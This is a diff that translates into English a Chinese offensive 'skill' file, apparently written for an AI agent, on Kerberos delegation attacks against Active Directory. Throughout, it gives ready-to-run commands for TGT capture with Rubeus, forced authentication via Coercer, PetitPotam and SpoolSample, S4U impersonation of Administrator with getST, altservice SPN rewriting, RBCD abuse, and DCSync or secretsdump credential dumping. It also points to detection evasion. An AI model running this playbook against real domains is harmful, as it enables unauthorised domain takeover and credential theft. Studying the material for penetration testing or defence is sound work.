@@ -1,82 +1,86 @@
 ---
 name: ad-delegation-attack
-description: "Kerberos 委派攻击（非约束/约束/RBCD）。当 BloodHound 发现委派配置、或已获取有 SPN 的服务账号/机器账号控制权时使用。通过 S4U 协议滥用可实现跨服务模拟任意用户，常用于域内权限提升和横向移动。"
+description: "Kerberos delegation attacks (unconstrained/constrained/RBCD). Use when BloodHound reveals delegation configuration, or when you already have control of a service or machine account with an SPN. Abusing the S4U protocol enables impersonating arbitrary users across services, and is commonly used for in-domain privilege escalation and lateral movement."
+zh-signals: "Kerberos 委派攻击（非约束/约束/RBCD），通过 S4U 滥用模拟任意用户实现域内提权与横向移动。信号:Kerberos委派,非约束委派,约束委派,RBCD,S4U"
+when-to-use: >-
+  Use when BloodHound reveals delegation configuration or you control a service
+  or machine account with an SPN, and want to impersonate users across services.
 metadata:
   tags: "kerberos,delegation,unconstrained,constrained,rbcd,s4u,s4u2self,s4u2proxy,impacket,rubeus,trustedtodelegatetoauth,msds-allowedtoactonbehalfofotheridentity"
   category: "lateral"
 ---
 
-# Kerberos 委派攻击
+# Kerberos Delegation Attacks
 
-## 触发条件
+## Trigger Conditions
 
-在以下场景使用本技能:
-- BloodHound 发现域内存在非约束/约束委派配置
-- 已控制配置了 SPN 的服务账号或机器账号
-- 对目标计算机对象拥有 GenericWrite/GenericAll/WriteDacl 权限
-- 需要通过委派实现权限提升或横向移动
+Use this skill in the following scenarios:
+- BloodHound reveals unconstrained/constrained delegation configuration in the domain
+- You control a service account or machine account configured with an SPN
+- You hold GenericWrite/GenericAll/WriteDacl permissions on the target computer object
+- You need to achieve privilege escalation or lateral movement through delegation
 
-## 前置要求
+## Prerequisites
 
-- 有效的域凭据（明文/Hash/票据）
-- 已枚举委派配置（或准备枚举）
-- 工具: findDelegation.py, getST.py, rbcd.py, addcomputer.py, Rubeus
+- Valid domain credentials (plaintext/hash/ticket)
+- Delegation configuration already enumerated (or ready to enumerate)
+- Tools: findDelegation.py, getST.py, rbcd.py, addcomputer.py, Rubeus
 
-## 委派类型速查
+## Delegation Type Quick Reference
 
-| 类型 | 关键标志/属性 | 攻击方式 |
+| Type | Key Flag/Attribute | Attack Method |
 |------|---------------|----------|
-| **非约束委派** | `TRUSTED_FOR_DELEGATION` (UAC 524288) | 捕获访问者 TGT |
-| **约束委派 (有协议转换)** | `msDS-AllowedToDelegateTo` + `TRUSTED_TO_AUTH_FOR_DELEGATION` | S4U2Self + S4U2Proxy |
-| **约束委派 (无协议转换)** | `msDS-AllowedToDelegateTo` | 需用户先认证或结合 RBCD |
-| **RBCD** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 配置后 S4U 攻击 |
+| **Unconstrained delegation** | `TRUSTED_FOR_DELEGATION` (UAC 524288) | Capture the visitor's TGT |
+| **Constrained delegation (with protocol transition)** | `msDS-AllowedToDelegateTo` + `TRUSTED_TO_AUTH_FOR_DELEGATION` | S4U2Self + S4U2Proxy |
+| **Constrained delegation (without protocol transition)** | `msDS-AllowedToDelegateTo` | Requires the user to authenticate first, or combine with RBCD |
+| **RBCD** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Configure it, then perform the S4U attack |
 
 ---
 
-## 决策树
+## Decision Tree
 
 ```
-[开始] 需要利用 Kerberos 委派
+[Start] You need to exploit Kerberos delegation
     │
-    ├─ 已知委派配置？
-    │   ├─ 否 → Phase 1: 委派枚举
-    │   └─ 是 → 判断类型
+    ├─ Is the delegation configuration known?
+    │   ├─ No → Phase 1: Delegation enumeration
+    │   └─ Yes → Determine the type
     │
-    ├─ 非约束委派 (Unconstrained)
-    │   ├─ 已控制该机器？
-    │   │   ├─ 是 → Phase 2: 监听 TGT + 强制认证
-    │   │   └─ 否 → 需先取得机器控制权
-    │   └─ 捕获 DC TGT → DCSync / 横向移动
+    ├─ Unconstrained delegation
+    │   ├─ Do you already control that machine?
+    │   │   ├─ Yes → Phase 2: Listen for the TGT + force authentication
+    │   │   └─ No → You must first obtain control of the machine
+    │   └─ Capture the DC TGT → DCSync / lateral movement
     │
-    ├─ 约束委派 (Constrained)
-    │   ├─ 有协议转换 (TrustedToAuthForDelegation)?
-    │   │   ├─ 是 → Phase 3: S4U2Self + S4U2Proxy 直接利用
-    │   │   └─ 否 → 需用户票据或结合 RBCD
-    │   ├─ 目标服务非 cifs/ldap → altservice 技巧改写 SPN
-    │   └─ 获取 ST → 访问目标服务
+    ├─ Constrained delegation
+    │   ├─ Is protocol transition available (TrustedToAuthForDelegation)?
+    │   │   ├─ Yes → Phase 3: Direct exploitation with S4U2Self + S4U2Proxy
+    │   │   └─ No → You need a user ticket or must combine with RBCD
+    │   ├─ The target service is not cifs/ldap → use the altservice trick to rewrite the SPN
+    │   └─ Obtain the ST → access the target service
     │
     ├─ RBCD
-    │   ├─ 对目标有写权限？
-    │   │   ├─ 是 → Phase 4: RBCD 攻击
-    │   │   └─ 否 → 寻找 ACL 路径
-    │   ├─ MAQ > 0 或已有机器账号 → 创建/使用机器账号
-    │   └─ 配置 → S4U → 访问 → 清理
+    │   ├─ Do you have write permission on the target?
+    │   │   ├─ Yes → Phase 4: RBCD attack
+    │   │   └─ No → Look for an ACL path
+    │   ├─ MAQ > 0 or a machine account already exists → create/use a machine account
+    │   └─ Configure → S4U → access → clean up
     │
-    └─ 无委派可利用 → 检查 ACL，考虑其他路径
+    └─ No exploitable delegation → Check ACLs and consider other paths
 ```
 
 ---
 
-## Phase 1: 委派枚举
+## Phase 1: Delegation Enumeration
 
-**目标**: 发现域内所有委派配置
+**Objective**: discover all delegation configuration in the domain
 
 ```bash
-# findDelegation.py (推荐，一次发现所有类型)
+# findDelegation.py (recommended, discovers all types in one run)
 findDelegation.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
 ```
 
-输出示例:
+Example output:
 ```
 AccountName   AccountType  DelegationType                      DelegationRightsTo
 ------------  -----------  ----------------------------------  --------------------------
@@ -85,13 +89,13 @@ SVC_SQL       User         Constrained w/ Protocol Transition  MSSQLSvc/db01.dom
 WEB01$        Computer     Constrained                         http/app01.domain.local
 ```
 
-### LDAP 过滤器
+### LDAP Filters
 
 ```
-# 非约束委派 (排除 DC)
+# Unconstrained delegation (excluding DCs)
 (&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))
 
-# 约束委派
+# Constrained delegation
 (&(objectCategory=*)(msDS-AllowedToDelegateTo=*))
 
 # RBCD
@@ -101,10 +105,10 @@ WEB01$        Computer     Constrained                         http/app01.domain
 ### PowerView
 
 ```powershell
-# 非约束委派 (排除 DC)
+# Unconstrained delegation (excluding DCs)
 Get-DomainComputer -Unconstrained | Where-Object {$_.name -notlike "*DC*"}
 
-# 约束委派
+# Constrained delegation
 Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
 ```
@@ -119,25 +123,25 @@ MATCH p=(u)-[:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
 
 ---
 
-## Phase 2: 非约束委派利用
+## Phase 2: Unconstrained Delegation Exploitation
 
-**前提**: 已控制一台非 DC 的 `TRUSTED_FOR_DELEGATION` 机器
+**Prerequisite**: you control a non-DC machine with `TRUSTED_FOR_DELEGATION`
 
-**原理**: 用户访问时 KDC 在 ST 中嵌入 TGT，服务器缓存到 LSASS。提取即可冒充。
+**Mechanism**: when a user accesses it, the KDC embeds the TGT in the ST, and the server caches it in LSASS. Extracting it allows impersonation.
 
 → [references/unconstrained-delegation.md](references/unconstrained-delegation.md)
 
-### 2.1 监听 TGT
+### 2.1 Listen for the TGT
 
 ```powershell
 Rubeus.exe monitor /interval:10 /nowrap
 Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
 ```
 
-### 2.2 强制认证触发
+### 2.2 Force Authentication to Trigger It
 
 ```bash
-# Coercer (集成多种方法)
+# Coercer (integrates multiple methods)
 coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_MACHINE> -t <DC_IP>
 
 # PetitPotam (MS-EFSRPC)
@@ -147,10 +151,10 @@ PetitPotam.py <UNCONSTRAINED_MACHINE> <DC_IP>
 SpoolSample.exe <DC_HOSTNAME> <UNCONSTRAINED_MACHINE>
 ```
 
-### 2.3 使用捕获的 TGT
+### 2.3 Use the Captured TGT
 
 ```powershell
-# 导入票据并 DCSync
+# Import the ticket and run DCSync
 Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass /ticket:<BASE64_TGT>
 steal_token <PID>
 dcsync <DOMAIN> <DOMAIN>\krbtgt
@@ -164,24 +168,24 @@ secretsdump.py -k -no-pass '<DOMAIN>/DC01$@dc01.<DOMAIN>'
 
 ---
 
-## Phase 3: 约束委派利用
+## Phase 3: Constrained Delegation Exploitation
 
-**前提**: 控制约束委派服务账号/机器账号的凭据
+**Prerequisite**: you control the credentials of a constrained delegation service account or machine account
 
 → [references/constrained-delegation.md](references/constrained-delegation.md)
 
-### 3A: 有协议转换 — S4U2Self + S4U2Proxy
+### 3A: With protocol transition — S4U2Self + S4U2Proxy
 
 ```bash
 # getST.py
 getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
   <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
 
-# 使用 Hash
+# Using a hash
 getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
   -hashes :<NT_HASH> <DOMAIN>/<SERVICE_ACCOUNT>
 
-# 使用票据
+# Using a ticket
 export KRB5CCNAME=Administrator.ccache
 secretsdump.py -k -no-pass <TARGET_FQDN>
 ```
@@ -191,12 +195,12 @@ secretsdump.py -k -no-pass <TARGET_FQDN>
 Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
 ```
 
-### altservice 技巧
+### The altservice Trick
 
-ST 中的 sname 未签名保护，可改写为同主机的其他服务:
+The sname in the ST is not protected by the signature, so it can be rewritten to another service on the same host:
 
 ```bash
-# 原目标 time/dc01 → 改为 ldap 用于 DCSync
+# Original target time/dc01 → change to ldap for DCSync
 getST.py -spn time/<DC_FQDN> -impersonate Administrator \
   -altservice cifs/<DC_FQDN> <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
 ```
@@ -205,12 +209,12 @@ getST.py -spn time/<DC_FQDN> -impersonate Administrator \
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:time/<DC_FQDN> /altservice:ldap /user:<SERVICE_ACCOUNT> /ticket:<BASE64_TGT> /nowrap
 ```
 
-### 3B: 无协议转换
+### 3B: Without protocol transition
 
-S4U2Self 票据不可转发，需额外手段:
+S4U2Self tickets are not forwardable, so extra measures are needed:
 
 ```bash
-# 方法 1: 结合 RBCD (在服务账号自身配置)
+# Method 1: combine with RBCD (configured on the service account itself)
 rbcd.py -delegate-from '<SERVICE_ACCOUNT>' -delegate-to '<SERVICE_ACCOUNT>$' \
   -action write <DOMAIN>/<USER>:<PASSWORD>
 getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
@@ -218,48 +222,48 @@ getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
 ```
 
 ```powershell
-# 方法 2: 捕获用户可转发票据后 S4U2Proxy
+# Method 2: capture a forwardable user ticket, then S4U2Proxy
 Rubeus.exe monitor /interval:5 /filteruser:Administrator
 Rubeus.exe s4u /ticket:<CAPTURED_TGT> /msdsspn:cifs/<TARGET_FQDN> /ptt
 ```
 
 ---
 
-## Phase 4: 基于资源的约束委派 (RBCD)
+## Phase 4: Resource-Based Constrained Delegation (RBCD)
 
-**前提**: 对目标有 GenericWrite/GenericAll/WriteDacl + 可创建或已有机器账号
+**Prerequisite**: GenericWrite/GenericAll/WriteDacl on the target + the ability to create or an existing machine account
 
 → [references/rbcd-attack.md](references/rbcd-attack.md)
 
-### 4.1 前提检查
+### 4.1 Prerequisite Checks
 
 ```bash
-# 检查 MAQ
+# Check MAQ
 crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> -M maq
 ```
 
 ```powershell
-# 检查 ACL
+# Check ACLs
 Get-DomainObjectAcl -Identity "<TARGET>" -ResolveGUIDs | Where-Object {
     $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"
 }
 ```
 
-### 4.2 创建机器账号
+### 4.2 Create a Machine Account
 
 ```bash
 addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd123' \
   -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
 ```
 
-### 4.3 配置 RBCD
+### 4.3 Configure RBCD
 
 ```bash
 rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TARGET>$' -action write \
   -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
 ```
 
-### 4.4 S4U 攻击
+### 4.4 S4U Attack
 
 ```bash
 getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
@@ -274,7 +278,7 @@ Rubeus.exe hash /password:P@ssw0rd123 /user:YOURPC$ /domain:<DOMAIN>
 Rubeus.exe s4u /user:YOURPC$ /rc4:<COMPUTED_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
 ```
 
-### 4.5 清理
+### 4.5 Cleanup
 
 ```bash
 rbcd.py -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
@@ -287,45 +291,45 @@ Get-DomainComputer -Identity <TARGET> | Set-DomainObject -Clear msDS-AllowedToAc
 
 ---
 
-## 常见问题排查
+## Common Issue Troubleshooting
 
-### S4U 失败: KDC_ERR_BADOPTION
+### S4U fails: KDC_ERR_BADOPTION
 
-1. 被模拟用户在 Protected Users 组 — 换一个用户
-2. 用户标记 "Account is sensitive and cannot be delegated" — 换用户
-3. 服务账号 SPN 缺失 — 确认已注册
-4. 无协议转换票据不可转发 — 结合 RBCD
+1. The impersonated user is in the Protected Users group — switch to another user
+2. The user is flagged "Account is sensitive and cannot be delegated" — switch to another user
+3. The service account SPN is missing — confirm it is registered
+4. Tickets without protocol transition are not forwardable — combine with RBCD
 
-### 无法创建机器账号
+### Cannot create a machine account
 
-1. 检查 `ms-DS-MachineAccountQuota` (默认 10)
-2. 配额耗尽 → 使用已控制的机器账号
-3. 查找域内已有 SPN 的用户账号
+1. Check `ms-DS-MachineAccountQuota` (default 10)
+2. The quota is exhausted → use a machine account you already control
+3. Look for user accounts in the domain that already have an SPN
 
-### RBCD 配置成功但 S4U 失败
+### RBCD configuration succeeds but S4U fails
 
-1. 确认机器账号有 SPN (`HOST/YOURPC` 自动注册)
-2. `rbcd.py -action read` 验证属性写入
-3. 确认 DNS 解析正确 — SPN 必须与 DNS 匹配
+1. Confirm the machine account has an SPN (`HOST/YOURPC` is registered automatically)
+2. Verify the attribute write with `rbcd.py -action read`
+3. Confirm DNS resolution is correct — the SPN must match the DNS name
 
 ---
 
-## 工具参考
+## Tool Reference
 
-| 工具 | 用途 | 平台 |
+| Tool | Purpose | Platform |
 |------|------|------|
-| findDelegation.py | 枚举所有委派配置 | Linux |
-| getST.py | S4U 攻击获取服务票据 | Linux |
-| rbcd.py | 配置/读取/清除 RBCD | Linux |
-| addcomputer.py | 创建/删除机器账号 | Linux |
-| Rubeus | Kerberos 票据操作 | Windows |
-| Coercer | 强制认证 (集成多种方法) | Linux |
-| PetitPotam | MS-EFSRPC 强制认证 | 跨平台 |
+| findDelegation.py | Enumerate all delegation configuration | Linux |
+| getST.py | S4U attack to obtain a service ticket | Linux |
+| rbcd.py | Configure/read/clear RBCD | Linux |
+| addcomputer.py | Create/delete machine accounts | Linux |
+| Rubeus | Kerberos ticket operations | Windows |
+| Coercer | Forced authentication (integrates multiple methods) | Linux |
+| PetitPotam | MS-EFSRPC forced authentication | Cross-platform |
 
 ---
 
-## 深入参考
+## Further Reading
 
-- → [references/unconstrained-delegation.md](references/unconstrained-delegation.md) — TGT 缓存机制、强制认证触发、检测规避
-- → [references/constrained-delegation.md](references/constrained-delegation.md) — S4U 协议机制、协议转换、altservice 技巧、跨域委派
-- → [references/rbcd-attack.md](references/rbcd-attack.md) — RBCD 完整攻击链、替代路径、Shadow Credentials、清理与 OPSEC
+- → [references/unconstrained-delegation.md](references/unconstrained-delegation.md) — TGT caching mechanism, forced authentication triggers, detection evasion
+- → [references/constrained-delegation.md](references/constrained-delegation.md) — S4U protocol mechanism, protocol transition, altservice trick, cross-domain delegation
+- → [references/rbcd-attack.md](references/rbcd-attack.md) — complete RBCD attack chain, alternative paths, Shadow Credentials, cleanup and OPSEC
